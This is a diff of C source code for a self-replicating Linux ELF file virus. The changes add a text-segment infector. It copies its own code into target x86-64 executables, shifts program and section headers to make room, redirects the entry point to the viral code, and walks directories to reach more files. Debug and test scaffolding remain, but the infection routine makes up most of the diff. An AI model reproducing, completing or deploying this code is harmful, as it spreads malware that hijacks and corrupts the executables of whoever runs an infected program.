@@ -1,6 +1,6 @@
 #include <fcntl.h>
 #include <elf.h>
-#include <dirent.h>     /* Defines DT_* constants */
+#include <dirent.h>
 #include <fcntl.h>
 #include <stdio.h>
 #include <unistd.h>
@@ -16,6 +16,59 @@ struct linux_dirent64 {
 	unsigned char	d_type;
 	char		d_name[0];
 };
+
+void infect_file(char*path, char *file);
+void virus_exit(long status);
+void code_end();
+void _start()
+{
+	/*
+	char c[100];
+	int file = virus_open("./test/test",O_RDONLY, 0);
+	virus_read(file,c,100);
+	virus_write(1,c,100);
+	virus_close(file);
+	virus_exit(0);
+	*/
+
+	/*
+	char buf[1024*1024];
+	char *start[1] = {"/home/lkm/workspace/virus/test"};
+	int dir = virus_open(start[0],O_RDONLY | O_DIRECTORY, 0);
+	char dirtmp[20];
+	//virus_write(1, virus_itoa(dir,dirtmp),13);
+	if(dir<0) virus_write(1,"dir wrong\n",13);
+	int nread = virus_getdents64(dir, (struct linux_dirent64 *)buf, 1024*1024);
+	if(nread<0) virus_write(1,"nread wrong\n",13);
+	
+	struct linux_dirent64 *d;
+	int bpos;
+	//virus_write(1, virus_itoa(nread,tmp), 20);
+	//virus_write(1, "\n", 20);
+	for (bpos = 0; bpos < nread; bpos++) {
+		d = (struct linux_dirent64 *) (buf + bpos);
+		bpos += d->d_reclen - 1;
+		if(d->d_type == DT_REG){
+			char fullpath[50];
+			getfullpath();
+		}else if(d->d_type == DT_REG){
+			
+		}
+		virus_write(1, d->d_name,virus_strlen(d->d_name));
+		virus_write(1, "\n", 1);
+        }
+	*/
+
+	/*
+	char *start[1] = {"/home/lkm/workspace/virus/test/"};
+	infect_dir(start[0]);
+	*/
+	char ss[] = {'/','h','o','m','e','/','l','k','m','/','w','o','r','k','s','p','a','c','e','/','v','i','r','u','s','/','t','e','s','t','/','t','e','s','t'};
+	//char *start[1] = {"/home/lkm/workspace/virus/test/test"};
+	char nn[] = {'/','h','o','m','e','/','l','k','m','/','w','o','r','k','s','p','a','c','e','/','v','i','r','u','s','/','t','e','s','t','/'};
+	infect_file(nn, ss);
+	virus_exit(0);
+}
 
 int virus_getdents64(unsigned int fd, struct linux_dirent64 *dirp,unsigned int count)
 {
@@ -145,6 +198,19 @@ size_t virus_strlen(char *s)
 	return size;
 }
 
+void virus_memcpy(void *dst, void *src, unsigned int len)
+{
+        int i;
+        unsigned char *s = (unsigned char *)src;
+        unsigned char *d = (unsigned char *)dst;
+
+        for (i = 0; i < len; i++) {
+                *d = *s;
+                s++, d++;
+        }
+
+}
+
 void virus_pathadd(char *path, char *dir, char *name){
 	int i=0;
 	int j=0;	
@@ -154,18 +220,18 @@ void virus_pathadd(char *path, char *dir, char *name){
 	path[i] = '\0';
 }
 
-void getfullpath(){
-	
+size_t align(size_t size){
+	return (size&(~(0x1000 - 1))) + 0x1000;
 }
 
-void infect_file(char *file){
+void infect_file(char*path, char *target){
 	/*
 	virus_write(1, file,virus_strlen(file));
 	virus_write(1, "\n", 1);
 	*/
 	//do some check
 	char headbuf[4096];
-	int f = virus_open(file,O_RDONLY, 0);
+	int f = virus_open(target,O_RDONLY, 0);
 	virus_read(f,headbuf,4096);
 	virus_close(f);
 	Elf64_Ehdr *ehdr = (Elf64_Ehdr *) headbuf;
@@ -173,22 +239,135 @@ void infect_file(char *file){
 	if(ehdr->e_machine != EM_X86_64) return;
 	
 	//load self
-	int self = virus_open("./test/test",O_RDONLY, 0);
+	//char test[] = {'.','/','t','e','s','t','/','t','e','s','t'};
+	int self = virus_open(target,O_RDONLY, 0);
 	struct stat s;
 	virus_fstat(self, &s);
 	char* mem = (char*)virus_mmap(NULL,s.st_size,PROT_READ|PROT_WRITE, MAP_PRIVATE, self, 0);
 	Elf64_Ehdr *self_ehdr = (Elf64_Ehdr *)mem;
 	Elf64_Phdr *self_phdr = (Elf64_Phdr *)&mem[self_ehdr->e_phoff];
 	Elf64_Shdr *self_shdr = (Elf64_Shdr *)&mem[self_ehdr->e_shoff];
+	/*
 	char nu[10];
 	virus_write(1, virus_itoa(ehdr->e_phnum,nu), 10);
+	char changeline[] = {'\n'};
+	virus_write(1, changeline, 1);
+	*/
 	
+	//change elf thing
+	//get code length, must add 1, ret is 1
+	size_t code_size = ((char *)&code_end - (char *)&_start)+1;
+	code_size = align(code_size);
+	/*
+	virus_write(1, virus_itoa(code_size,nu), 10);
+	virus_write(1, changeline, 1);
+	code_size = align(code_size);
+	virus_write(1, virus_itoa(code_size,nu), 10);
+	virus_write(1, changeline, 1);
+	*/
+	/*
+	char nu[100];
+	virus_write(1, virus_itoa(code_size,nu), 10);
+	char changeline[] = {'\n'};
+	virus_write(1, changeline, 1);
+	*/
+	//Elf64_Addr old_entry_point = 
+
+	//1:new memory
+	//2:copy file context to memory
+	//3:change memory's info
+	//4:write to file
+
+	//1
+	char *newmem = (char*)virus_mmap(NULL, s.st_size+code_size, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
+	//2	
+	virus_memcpy(newmem,mem,s.st_size);
+	//3
+	Elf64_Ehdr *new_ehdr = (Elf64_Ehdr *)newmem;
+	Elf64_Phdr *new_phdr = (Elf64_Phdr *)&newmem[new_ehdr->e_phoff];
+	Elf64_Shdr *new_shdr = (Elf64_Shdr *)&newmem[new_ehdr->e_shoff];
+	/*
+	virus_write(1, virus_itoa(new_ehdr->e_phnum,nu), 10);
+	virus_write(1, changeline, 1);
+	*/
+	//because next loop ingore first two segemnt , so need to add first
+	new_phdr[0].p_offset += code_size;
+	new_phdr[1].p_offset += code_size;
+	//3.1	
+	//new_ehdr->e_shoff += code_size;
+	//3.2 and 3.3
+	int i;
+	int findtext = 0;
+	for (i = 0; i < new_ehdr->e_phnum; i++) {
+		if(findtext != 0){
+			new_phdr[i].p_offset += code_size;
+		}
+		if (new_phdr[i].p_type == PT_LOAD && new_phdr[i].p_flags == (PF_R|PF_X)){
+			/*
+			char nu[10];
+			char changeline[] = {'\n'};
+			virus_write(1, virus_itoa(i,nu), 10);
+			virus_write(1, changeline, 1);
+			
+			virus_write(1, virus_itoa(self_phdr[i].p_vaddr,nu), 10);
+			virus_write(1, changeline, 1);
+			*/
+			/*
+			char nnu[10];
+			virus_write(1, virus_itoa(code_size,nnu), 10);
+			virus_write(1, changeline, 1);
+			*/
+			new_phdr[i].p_vaddr -= code_size;
+			new_phdr[i].p_paddr -= code_size;
+			new_phdr[i].p_filesz += code_size;
+			new_phdr[i].p_memsz += code_size;
+			new_phdr[i].p_align = 0x1000;
+			findtext = i;
+			continue;
+		}else if(new_phdr[i].p_type == PT_LOAD && new_phdr[i].p_offset && (new_phdr[i].p_flags & PF_W)){
+			new_phdr[i].p_align = 0x1000;
+		}
+	}
+	//3.4
+	new_ehdr->e_entry = self_phdr[findtext].p_vaddr - code_size + sizeof(Elf64_Ehdr);
+	/*char nu[10];	
+	char changeline[] = {'\n'};
+	virus_write(1, virus_itoa(new_ehdr->e_entry,nu), 10);
+	virus_write(1, changeline, 1);*/
+	//3.5
+	
+	//4
+	for (i = 0; i < new_ehdr->e_shnum; i++) {
+		new_shdr[i].sh_offset += code_size;
+	}
+	new_ehdr->e_phoff += code_size;
+	new_ehdr->e_shoff += code_size;
+
+	char ttt[] = {'v','v','v'};
+	char newfilepath[256];
+	const __mode_t mode = S_IRUSR|S_IWUSR|S_IXUSR|S_IRGRP|S_IXGRP|S_IWGRP|S_IROTH;
+	virus_pathadd(newfilepath,path,ttt);
+	int newfile = virus_open(newfilepath,O_RDWR | O_CREAT, mode);
+	virus_write(newfile, newmem, sizeof(Elf64_Ehdr));
+	virus_write(newfile, (char *)&_start, code_size);
+	virus_write(newfile, newmem+sizeof(Elf64_Ehdr), s.st_size-sizeof(Elf64_Ehdr));
+	
+	/*
+	char rr[10];
+	virus_write(1, virus_itoa(new_ehdr->e_phnum,rr), 10);
+	virus_write(1, virus_itoa(ehdr->e_phnum,rr), 10);
+	*/
+
+	//remove old file, and rename new file
+
+	virus_close(newfile);
 }
 
 //dir must end with /
 void infect_dir(char* path){
 	virus_write(1, path,virus_strlen(path));
-	virus_write(1, "\n", 1);
+	char changeline[] = {'\n'};
+	virus_write(1, changeline, 1);
 	struct linux_dirent64 *d;
 	char buf[1024*1024];
 	int bpos;
@@ -202,7 +381,7 @@ void infect_dir(char* path){
 		//ignore all hide file .. and .
 		if(d->d_name[0] == '.') continue;
 		if(d->d_type == DT_REG){
-			infect_file(fullpath);
+			infect_file(path, fullpath);
 		}else if(d->d_type == DT_DIR){
 			int endpos = virus_strlen(fullpath);
 			fullpath[endpos] = '/';
@@ -216,51 +395,5 @@ void infect_dir(char* path){
         }
 }
 
-void _start()
-{
-	/*
-	char c[100];
-	int file = virus_open("./test/test",O_RDONLY, 0);
-	virus_read(file,c,100);
-	virus_write(1,c,100);
-	virus_close(file);
-	virus_exit(0);
-	*/
-
-	/*
-	char buf[1024*1024];
-	char *start[1] = {"/home/lkm/workspace/virus/test"};
-	int dir = virus_open(start[0],O_RDONLY | O_DIRECTORY, 0);
-	char dirtmp[20];
-	//virus_write(1, virus_itoa(dir,dirtmp),13);
-	if(dir<0) virus_write(1,"dir wrong\n",13);
-	int nread = virus_getdents64(dir, (struct linux_dirent64 *)buf, 1024*1024);
-	if(nread<0) virus_write(1,"nread wrong\n",13);
-	
-	struct linux_dirent64 *d;
-	int bpos;
-	//virus_write(1, virus_itoa(nread,tmp), 20);
-	//virus_write(1, "\n", 20);
-	for (bpos = 0; bpos < nread; bpos++) {
-		d = (struct linux_dirent64 *) (buf + bpos);
-		bpos += d->d_reclen - 1;
-		if(d->d_type == DT_REG){
-			char fullpath[50];
-			getfullpath();
-		}else if(d->d_type == DT_REG){
-			
-		}
-		virus_write(1, d->d_name,virus_strlen(d->d_name));
-		virus_write(1, "\n", 1);
-        }
-	*/
-
-	/*
-	char *start[1] = {"/home/lkm/workspace/virus/test/"};
-	infect_dir(start[0]);
-	*/
-
-	char *start[1] = {"/home/lkm/workspace/virus/test/test"};
-	infect_file(start[0]);
-	virus_exit(0);
+void code_end(){
 }
